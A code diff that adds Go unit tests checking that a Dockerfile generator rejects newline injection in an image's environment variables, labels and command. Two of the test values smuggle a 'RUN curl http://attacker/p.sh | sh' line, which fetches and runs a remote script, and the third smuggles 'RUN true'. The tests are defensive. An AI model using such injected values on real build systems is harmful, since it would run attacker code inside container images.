@@ -107,6 +107,51 @@ COPY --from=bbbb  . .
 COPY --from=cccc  . .`,
 			wantErr: false,
 		},
+		{
+			name: "reject newline injection in env",
+			args: args{
+				ociList: []map[string]v1.Image{
+					{
+						"aaaa": {
+							Config: v1.ImageConfig{
+								Env: []string{"A=x\nRUN curl http://attacker/p.sh | sh"},
+							},
+						},
+					},
+				},
+			},
+			wantErr: true,
+		},
+		{
+			name: "reject newline injection in label",
+			args: args{
+				ociList: []map[string]v1.Image{
+					{
+						"aaaa": {
+							Config: v1.ImageConfig{
+								Labels: map[string]string{"a": "x\nRUN curl http://attacker/p.sh | sh"},
+							},
+						},
+					},
+				},
+			},
+			wantErr: true,
+		},
+		{
+			name: "reject newline injection in cmd",
+			args: args{
+				ociList: []map[string]v1.Image{
+					{
+						"aaaa": {
+							Config: v1.ImageConfig{
+								Cmd: []string{"x\nRUN true"},
+							},
+						},
+					},
+				},
+			},
+			wantErr: true,
+		},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
